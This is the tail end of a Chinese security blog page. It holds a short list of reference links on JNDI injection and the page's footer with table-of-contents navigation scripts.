<p><a href="https://www.freebuf.com/vuls/115849.html" target="_blank" rel="noopener">Jndi注入及Spring RCE漏洞分析</a></p>
<p><a href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/" target="_blank" rel="noopener">BlackHat 2016 回顾之 JNDI 注入简单解析</a></p>
<p><a href="https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">Java代码审计学习之JNDI注入</a></p>
<p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></p>

</div>

<br>
<div><center>
  <span>Copyright &copy; Mi1k7ea</span>  |  <span id="busuanzi_container_site_uv">本站总访问量 <span id="busuanzi_value_site_uv"></span> 次</span>
</center></div>


  <div class="book-comments">
    




  </div>


<script src="/js/book-post.js"></script>
        </div>
      </div>

      <div class="column col-2 hide-lg">
        <div class="book-toc">
  <div class="book-tocbot">
  </div>
  <div class="book-tocbot-menu">
    <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
    <a onclick="go_top()">Back to top</a>
    <a onclick="go_bottom()">Go to bottom</a>
  </div>
</div>

<script>
tocbot.init({
  tocSelector: '.book-tocbot',
  contentSelector: '.book-post',
  headingSelector: 'h1, h2, h3, h4, h5',
  collapseDepth: 2,
  orderedList: false,
  scrollSmooth: false,
});

function expand_toc(){
  var b = document.querySelector(".book-toc-expand");
  tocbot.init({
    tocSelector: '.book-tocbot',
    contentSelector: '.book-post',
    headingSelector: 'h1, h2, h3, h4, h5',
    collapseDepth: 6,
    orderedList: false,
    scrollSmooth: false,
  });
  b.setAttribute("onclick", "collapse_toc()");
  b.innerHTML = "Collapse all"
}

function collapse_toc(){
  var b = document.querySelector(".book-toc-expand");
  tocbot.init({
    tocSelector: '.book-tocbot',
    contentSelector: '.book-post',
    headingSelector: 'h1, h2, h3, h4, h5',
    collapseDepth: 2,
    orderedList: false,
    scrollSmooth: false,
  });
  b.setAttribute("onclick", "expand_toc()");
  b.innerHTML = "Expand all"
}

function go_top() {
  window.scrollTo(0, 0);
}

function go_bottom() {
  window.scrollTo(0, document.body.scrollHeight);
}

</script>
      </div>
    </div>
  </div>
</div>

</body>
</html>
